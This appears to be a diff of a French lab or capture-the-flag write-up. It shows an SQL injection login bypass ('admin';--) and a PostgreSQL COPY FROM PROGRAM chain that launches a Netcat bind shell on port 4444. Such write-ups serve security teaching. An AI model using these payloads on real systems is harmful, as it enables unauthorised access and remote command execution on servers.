@@ -10,7 +10,7 @@ On constate qu'un service http est actif. On insère donc l'IP dans l'url d'un n
 
 On remarque un onglet de login sur la page. Le type de faille le plus commun sur ce type de formulaire étant la SQL Injection, on effectue une injection pour se connecter en tant qu'admin pour vérifier si le site y est sensible ou non :
 ![img](3.PNG)
-![img](4.PNG)
+![img](4.PNG)  
 Nous sommes actuellement connectés en tant que l'utilisateur admin du site.
 Pour ce faire, dans l'input de username, on a inséré `admin';--`, qui va retourner un fois inséré à son tour dans la requête effectuée au serveur de bases de données en back-end, une requête du type :
 ```sql
@@ -22,9 +22,9 @@ Cela permet donc de ne vérfier que le nom d'utilisateur et de commenter la part
 
 Maintenant que l'on sait que le site est sensible aux injections SQL, et que l'on a vu que le fait d'être connecté en tant qu'admin ne nous avançait pas vraiment, le but est de trouver le moyen d'atteindre la machine serveur directement depuis ce formulaire de login. Le fait est qu'il est possible d'exécuter des commandes système arbitrairement sur la machine serveur avec des requêtes SQL, les RCE (Remote Code Execution). Ainsi, en tapant les commandes suivantes, le mieux étant de les taper une à une pour éviter tout problème, on peut récupérer un bind shell sur la machine cible :
 ```SQL
-'; DROP TABLE IF EXISTS cmd_exec;-- On supprime ici la table cmd_exec afin de nettoyer la base de données avant de faire notre exploit
+'; DROP TABLE IF EXISTS cmd_exec;-- On supprime ici la table cmd_exec si elle existe, afin de nettoyer la base de données avant de faire notre exploit
 '; CREATE TABLE cmd_exec(cmd_output text);-- On recrée la table, qui va contenir dans son unique colonne une commande
-'; COPY cmd_exec FROM PROGRAM 'nc -l 4444 -e /bin/bash';-- On copie dans notre table la commande suivante, qui va ouvrir une connexion Netcat sur le port 4444, et qui va fournir à l'utilisateur qui se connecte un shell, c'est notre bind shell
+'; COPY cmd_exec FROM PROGRAM 'nc -l -p 4444 -e /bin/bash';-- On copie dans notre table la commande suivante, qui va ouvrir une connexion Netcat sur le port 4444, et qui va fournir à l'utilisateur qui se connecte un shell, c'est notre bind shell
 '; SELECT * FROM cmd_exec;-- Cette requête va exécuter la commande copiée dans la table plus tôt
 ```
 
